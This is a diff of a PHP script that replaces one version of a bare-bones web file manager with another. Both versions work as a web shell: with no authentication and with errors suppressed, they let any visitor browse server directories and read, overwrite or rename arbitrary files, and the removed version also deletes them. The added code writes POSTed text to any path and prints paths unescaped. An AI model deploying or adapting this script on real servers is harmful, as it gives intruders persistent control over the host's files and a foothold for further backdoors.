@@ -1,115 +1,125 @@
-<?php 
-error_reporting(0);
-@define('SEP', '/');
-function pwd() {
-	$pwd = @str_replace('\\', '/', @getcwd());
-	return $pwd;
-}
-function cwd() {
-	$cwd = @explode('/', pwd());
-	foreach ($cwd as $key => $index) {
-		print("<a href='?dir=");
-		for ($i=0; $i <= $key ; $i++) {
-			print($cwd[$i]);
-			if ($i != $key) {
-				print("/");
-			}
-		} print("'>".$index."</a>/");
+<style type="text/css">
+	body {
+		font-family: Arial;
+		color:#000;
+	} a {
+		color:#000;
+		text-decoration:none;
+	} table, tr, td {
+		border:1px solid #000;
+		border-spacing:0;
+		border-collapse: collapse;
 	}
+</style>
+<?php
+error_reporting(0);
+define('SEP', '/');
+function cwd() {
+	$cwd = @str_replace('\\', '/', @getcwd());
+	return $cwd;
 }
-function scdir() {
-	$scdir = @scandir(@pwd());
-	return $scdir;
+function pwd() {
+    $dir = explode("/", @cwd());
+    foreach($dir as $key => $index) {
+        print "<a href='?dir=";
+        for($i = 0; $i <= $key; $i++) {
+            print $dir[$i];
+            if($i != $key) {
+            print "/";
+            }
+        }
+        print "'>".$index."</a>/";
+    }
 }
-function alert_success($message) {
-	?><script>window.location='<?php print $message ?>';</script><?php
-}
-function edit($filename) {
-	if (isset($_POST['edit'])) {
-		if (@file_put_contents($filename, $_POST['edit'])) {
+@pwd();
+if ($_POST['do'] == 'edit') {
+	if (isset($_POST['text'])) {
+		$fp = @fopen($_POST['file'], 'w');
+		if (@fwrite($fp, $_POST['text'])) {
 			$nb = "Success";
 		} else {
 			$nb = "Failed";
 		}
-	} $text = @htmlspecialchars(@file_get_contents($filename));
+	} $text = @htmlspecialchars(@file_get_contents($_POST['file']));
 	?>
-	<center>
-		<h4>Filename : <?php print $filename ?></h4>
-		<form method="post">
-			<textarea name="edit"><?php print $text ?></textarea><br>
-			<input type="submit">
-		</form>
-	</center>
+	<form method="post">
+		<textarea name="text"><?php print $text ?></textarea>
+		<input type="hidden" name="do" value="edit">
+		<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
+		<input type="submit">
+	</form>
 	<?php
-	die($nb);
 }
-function delete($filename) {
-	if (@file_exists($filename)) {
-		if (@unlink($filename)) {
-			@alert_success("?dir=".@pwd()."");
-		} else {
-			print("Failed");
-		}
-	}
-}
-function renames($filename) {
+if ($_POST['do'] == 'rename') {
 	if (isset($_POST['rename'])) {
-		if (@rename($filename, $_POST['rename'])) {
+		if (@rename($_POST['file'], $_POST['rename'])) {
 			$nb = "Success";
 		} else {
-			$nb = "Success";
+			$nb = "Failed";
 		}
 	}
 	?>
-	<center>
-		<form method="post">
-			<input type="text" name="rename" value="<?php print $filename ?>">
-			<input type="submit">
-		</form>
-	</center>
+	<form method="post">
+		<input type="text" name="rename" value="<?php print $_POST['file'] ?>">
+		<input type="hidden" name="do" value="rename">
+		<input type="hidden" name="file" value="<?php print $_POST['file'] ?>">
+	</form>
 	<?php
-	die($nb);
 }
 if (isset($_GET['dir'])) {
 	@chdir($_GET['dir']);
-} if (isset($_GET['action']) && $_POST['do'] == 'edit' and isset($_POST['files'])) {
-	@edit($_POST['files']);
-} elseif ($_POST['do'] == 'delete_file' and isset($_POST['files'])) {
-	@delete($_POST['files']);
-} elseif ($_POST['do'] == 'rename' and isset($_POST['files'])) {
-	@renames($_POST['files']);
 }
-cwd();
 ?>
 <table>
 	<tr>
 		<th>Filename</th>
+		<th>Action</th>
 	</tr>
-<?php
-foreach (@scdir() as $dir) {
-	if(!is_dir($dir)) continue;
-	if ($dir === '.') {
-		$act = "<center>--</center>";
-	} elseif ($dir === '..') {
-		$act = "<center>--</center>";
-	}
-	print("<tr><td>");
-	print("<a href='?dir=".@pwd().SEP.$dir."'>".$dir."</a></td>");
+<?php 
+$scdir = @scandir(@cwd());
+foreach ($scdir as $dir) {
+	if (!is_dir($dir)) continue;
+	if ($dir === '.' || $dir === '..') continue;
+	?>
+	<tr>
+		<td>
+			<a href="?dir=<?php print @cwd().SEP.$dir ?>"><?php print $dir ?></a>
+		</td>
+		<td>
+			<center>
+				<form method="post" accept="?dir=<?php print @cwd() ?>">
+					<select name="do">
+						<option value="rename">Rename</option>
+					</select>
+					<input type="hidden" name="file" value="<?php print @cwd().SEP.$dir ?>">
+					<input type="submit">
+				</form>
+			</center>
+		</td>
+	</tr>
+	<?php
 }
-foreach (@scdir() as $file) {
-	if(!is_file($file)) continue;
-	$tools = "<center>
-	          <form method='post' action='?action&dir=".@base64_encode(@pwd())."'>
-	          <select name='do'>
-	          <option name=''>Select</option>
-	          <option value='edit'>edit</option>
-	          <option value='delete_file'>Delete</option>
-	          <option value='rename'>Rename</option>
-	          </select>
-	          <input type='hidden' name='files' value='".@pwd().SEP.$file."'>
-	          <input type='submit' value='>'>
-	          </form></center>";
-	print("<tr><td>");
-	print("<a href=''>".$file."</a></td>");
-	print("<td>".$tools."</td>");
+foreach ($scdir as $file) {
+	if (!is_file($file)) continue;
+	?>
+	<tr>
+		<td>
+			<a href=""><?php print $file ?></a>
+		</td>
+		<td>
+			<center>
+				<form method="post" accept="?dir=<?php print @cwd() ?>">
+					<select name="do">
+						<option value="edit">Edit</option>
+						<option value="rename">Rename</option>
+					</select>
+					<input type="hidden" name="file" value="<?php print @cwd().SEP.$file ?>">
+					<input type="submit">
+				</form>
+			</center>
+		</td>
+	</tr>
+	<?php
 }
+ ?>
+</table>
